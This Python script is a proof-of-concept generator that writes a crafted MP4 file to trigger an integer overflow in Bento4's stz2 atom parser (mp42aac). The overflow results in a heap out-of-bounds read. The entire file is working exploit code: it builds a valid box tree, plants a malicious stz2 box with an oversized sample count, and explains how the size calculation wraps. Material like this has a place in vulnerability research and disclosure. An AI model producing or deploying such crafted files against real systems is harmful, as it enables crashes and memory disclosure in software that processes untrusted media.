#!/usr/bin/env python3
"""
VULN 002 PoC generator: stz2 table_size integer overflow -> heap OOB read
in AP4_Stz2Atom::AP4_Stz2Atom() in Bento4/mp42aac.

field_size=16, sample_count=0x10000001:
  table_size = (0x10000001 * 16 + 7) / 8
  32-bit mul: 0x10000001 * 16 = 0x100000010 -> wraps to 0x10 = 16
  table_size = (16 + 7) / 8 = 2
  size check passes (2+8 <= box size)
  AP4_Array SetItemCount(0x10000001) allocates huge buffer or bad_allocs
  loop reads buffer[i*2] for i=0..0x10000001-1 => OOB read
"""

import struct
import os

OUTPUT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.mp4")


def box(box_type: bytes, payload: bytes) -> bytes:
    """Build a 4-byte-size + 4-byte-type box."""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload


def fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """Build a full box (version + flags prefix)."""
    return box(box_type, struct.pack(">I", (version << 24) | (flags & 0xFFFFFF)) + payload)


# ── ftyp ─────────────────────────────────────────────────────────────────────
ftyp = box(b"ftyp",
           b"mp42"          # major_brand
           + struct.pack(">I", 0)   # minor_version
           + b"mp42" + b"isom")     # compatible brands


# ── mvhd ─────────────────────────────────────────────────────────────────────
mvhd_payload = (
    struct.pack(">II", 0, 0)    # creation/modification time
    + struct.pack(">I", 1000)   # timescale
    + struct.pack(">I", 0)      # duration
    + struct.pack(">i", 0x00010000)  # rate (1.0)
    + struct.pack(">h", 0x0100)      # volume (1.0)
    + b"\x00" * 10              # reserved
    + struct.pack(">9i",        # matrix (identity)
                  0x00010000, 0, 0,
                  0, 0x00010000, 0,
                  0, 0, 0x40000000)
    + b"\x00" * 24              # pre_defined
    + struct.pack(">I", 2)      # next_track_ID
)
mvhd = fullbox(b"mvhd", 0, 0, mvhd_payload)


# ── tkhd ─────────────────────────────────────────────────────────────────────
tkhd_payload = (
    struct.pack(">II", 0, 0)    # creation/modification time
    + struct.pack(">I", 1)      # track_ID
    + struct.pack(">I", 0)      # reserved
    + struct.pack(">I", 0)      # duration
    + b"\x00" * 8               # reserved
    + struct.pack(">hh", 0, 0)  # layer, alternate_group
    + struct.pack(">h", 0x0100) # volume
    + b"\x00" * 2               # reserved
    + struct.pack(">9i",        # matrix (identity)
                  0x00010000, 0, 0,
                  0, 0x00010000, 0,
                  0, 0, 0x40000000)
    + struct.pack(">II", 0, 0)  # width, height
)
tkhd = fullbox(b"tkhd", 0, 3, tkhd_payload)


# ── mdhd ─────────────────────────────────────────────────────────────────────
mdhd_payload = (
    struct.pack(">II", 0, 0)    # creation/modification time
    + struct.pack(">I", 44100)  # timescale
    + struct.pack(">I", 0)      # duration
    + struct.pack(">I", 0)      # language + pre_defined
)
mdhd = fullbox(b"mdhd", 0, 0, mdhd_payload)


# ── hdlr ─────────────────────────────────────────────────────────────────────
hdlr_payload = (
    struct.pack(">I", 0)    # pre_defined
    + b"soun"               # handler_type
    + b"\x00" * 12          # reserved
    + b"SoundHandler\x00"
)
hdlr = fullbox(b"hdlr", 0, 0, hdlr_payload)


# ── smhd ─────────────────────────────────────────────────────────────────────
smhd = fullbox(b"smhd", 0, 0, struct.pack(">hH", 0, 0))  # balance + reserved


# ── dref / dinf ──────────────────────────────────────────────────────────────
url_entry = fullbox(b"url ", 0, 1, b"")   # self-contained flag
dref_payload = struct.pack(">I", 1) + url_entry  # entry_count=1
dref = fullbox(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)


# ── stsd ─────────────────────────────────────────────────────────────────────
# Minimal mp4a sample entry
mp4a_payload = (
    b"\x00" * 6             # reserved
    + struct.pack(">H", 1)  # data_reference_index
    + b"\x00" * 8           # reserved
    + struct.pack(">HH", 2, 16)   # channel_count=2, sample_size=16
    + struct.pack(">H", 0)  # pre_defined
    + struct.pack(">H", 0)  # reserved
    + struct.pack(">I", 44100 << 16)  # samplerate (16.16)
)
mp4a = box(b"mp4a", mp4a_payload)
stsd_payload = struct.pack(">I", 1) + mp4a   # entry_count=1
stsd = fullbox(b"stsd", 0, 0, stsd_payload)


# ── stts ─────────────────────────────────────────────────────────────────────
stts = fullbox(b"stts", 0, 0, struct.pack(">I", 0))  # entry_count=0


# ── stz2 (malicious) ─────────────────────────────────────────────────────────
# Header: version(1)+flags(3) + reserved(3) + field_size(1) + sample_count(4)
# = 4 + 3 + 1 + 4 = 12 bytes of fullbox payload
# Total box: 8 (size+type) + 4 (version+flags) + 3 (reserved) + 1 (field_size)
#           + 4 (sample_count) = 20 bytes
#
# Trigger: sample_count=0x10000001, field_size=16
#   -> 32-bit: 0x10000001 * 16 wraps to 0x10 = 16
#   -> table_size = (16+7)/8 = 2  (size check passes)
#   -> SetItemCount(0x10000001) => OOM/bad_alloc or succeeds
#   -> loop OOB read

SAMPLE_COUNT = 0x10000001
FIELD_SIZE   = 16

stz2_payload = (
    b"\x00\x00\x00"           # reserved (3 bytes)
    + struct.pack(">B", FIELD_SIZE)          # field_size (1 byte)
    + struct.pack(">I", SAMPLE_COUNT)        # sample_count (4 bytes, big-endian)
    # zero actual entries — triggers OOB
)
stz2 = fullbox(b"stz2", 0, 0, stz2_payload)


# ── stco ─────────────────────────────────────────────────────────────────────
stco = fullbox(b"stco", 0, 0, struct.pack(">I", 0))  # entry_count=0


# ── stbl ─────────────────────────────────────────────────────────────────────
stbl = box(b"stbl", stsd + stts + stz2 + stco)


# ── minf ─────────────────────────────────────────────────────────────────────
minf = box(b"minf", smhd + dinf + stbl)


# ── mdia ─────────────────────────────────────────────────────────────────────
mdia = box(b"mdia", mdhd + hdlr + minf)


# ── trak ─────────────────────────────────────────────────────────────────────
trak = box(b"trak", tkhd + mdia)


# ── moov ─────────────────────────────────────────────────────────────────────
moov = box(b"moov", mvhd + trak)


# ── assemble and write ────────────────────────────────────────────────────────
mp4_data = ftyp + moov

with open(OUTPUT_PATH, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print(f"[+] stz2 box: field_size={FIELD_SIZE}, sample_count=0x{SAMPLE_COUNT:08X}")
print(f"[+] Expected 32-bit overflow: {SAMPLE_COUNT} * {FIELD_SIZE} = "
      f"0x{(SAMPLE_COUNT * FIELD_SIZE) & 0xFFFFFFFF:X} (wrapped)")
